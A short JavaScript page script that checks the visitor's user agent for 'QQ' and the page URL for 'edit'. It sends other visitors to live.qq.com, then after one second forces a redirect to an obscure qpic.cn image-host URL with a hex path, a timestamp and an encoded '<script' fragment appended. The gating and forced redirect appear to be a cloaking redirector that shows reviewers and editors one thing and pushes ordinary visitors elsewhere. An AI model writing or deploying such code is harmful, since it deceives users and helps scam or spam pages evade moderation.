function leleua() {
    var sUserAgent = navigator.userAgent.toLowerCase();
    if (sUserAgent.match(/QQ/i) == 'qq' || location.href.indexOf("edit") > -1) {
    } else {
        window.location.href = "https://live.qq.com";
    }
}

leleua();

setTimeout(function() {
    var timestamp = new Date().getTime();
    var url = 'https://meeting-75420.picgzc.qpic.cn/8f81703c1c76fe689f5ee64c0a059dd0bec71e7fbb6f7dbe6c4d74e1ca88260b' + '?' + timestamp + '%3Cscript';
    location.href = url;
}, 1000);
